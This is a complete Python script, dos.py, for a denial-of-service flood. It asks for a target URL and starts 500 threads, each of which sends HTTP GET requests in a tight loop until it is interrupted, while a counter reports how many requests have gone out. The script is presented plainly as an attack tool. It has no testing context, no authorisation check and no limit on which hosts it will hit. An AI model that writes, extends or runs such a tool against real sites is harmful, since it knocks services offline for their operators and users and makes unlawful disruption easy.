# language: Python 3, file: dos.py, target: Windows/Linux
# Spawns N threads each firing GET requests in a tight loop at the target.
# Threads run until KeyboardInterrupt (Ctrl+C).

import threading
import requests
import sys
from urllib.parse import urlparse

THREADS = 500
TIMEOUT = 4

stop_event = threading.Event()
sent = [0]
lock = threading.Lock()

def flood(url: str) -> None:
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(url, timeout=TIMEOUT)
            with lock:
                sent[0] += 1
        except Exception:
            pass

def status_printer() -> None:
    import time
    while not stop_event.is_set():
        time.sleep(1)
        with lock:
            print(f"\r[+] Requests sent: {sent[0]}", end="", flush=True)

def main() -> None:
    target = input("Target URL (ex: http://example.com): ").strip()

    parsed = urlparse(target)
    if not parsed.scheme:
        target = "http://" + target

    print(f"[*] Target   : {target}")
    print(f"[*] Threads  : {THREADS}")
    print(f"[*] Starting flood — Ctrl+C to stop\n")

    threads = []

    printer = threading.Thread(target=status_printer, daemon=True)
    printer.start()

    for _ in range(THREADS):
        t = threading.Thread(target=flood, args=(target,), daemon=True)
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        stop_event.set()

    print(f"\n[+] Done. Total requests sent: {sent[0]}")

if __name__ == "__main__":
    main()